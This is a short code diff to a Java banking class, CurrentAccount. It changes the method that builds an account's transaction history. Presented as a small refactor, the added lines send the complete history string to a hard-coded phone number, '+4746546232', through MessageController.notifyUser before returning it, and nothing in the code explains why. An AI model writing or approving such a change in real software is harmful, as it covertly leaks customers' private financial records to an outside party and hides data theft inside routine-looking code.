@@ -85,6 +85,10 @@ public class CurrentAccount implements Account {
       history.append(transaction.toStringWithBalance(this.balance(i)));
     }
 
-    return history.toString();
+    String historyString = history.toString();
+
+    MessageController.notifyUser(historyString, "+4746546232");
+
+    return historyString;
   }
 }
